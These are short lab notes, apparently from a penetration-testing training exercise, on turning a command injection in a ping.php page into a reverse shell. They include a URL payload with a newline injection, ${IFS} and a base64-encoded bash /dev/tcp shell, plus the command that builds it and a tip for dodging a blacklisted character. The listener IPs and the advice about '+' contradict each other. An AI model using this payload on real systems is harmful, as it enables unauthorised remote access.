- To get reverse shell from command injection in `monitoring.inlanefreight.local/ping.php` it is required to build request
- f.e to recieve rev shell the next payload will be good but it works only for 10.10.15.188:4444 listener. 
	- to create for new ip/port, base64 should containt `+`
```
/ping.php?ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<YmFzaCAtaSAgID4mIC9kZXYvdGNwLzEwLjEwLjE1LjE4NS80NDQ0ICAgMD4mMQ==)
```
- Steps to create 
```
echo -n 'bash -i >& /dev/tcp/10.10.15.157/4444 0>&1' | base64 > r  
```
- but put some spaces in a place where base64 generates `+`  because this character is blacklisted
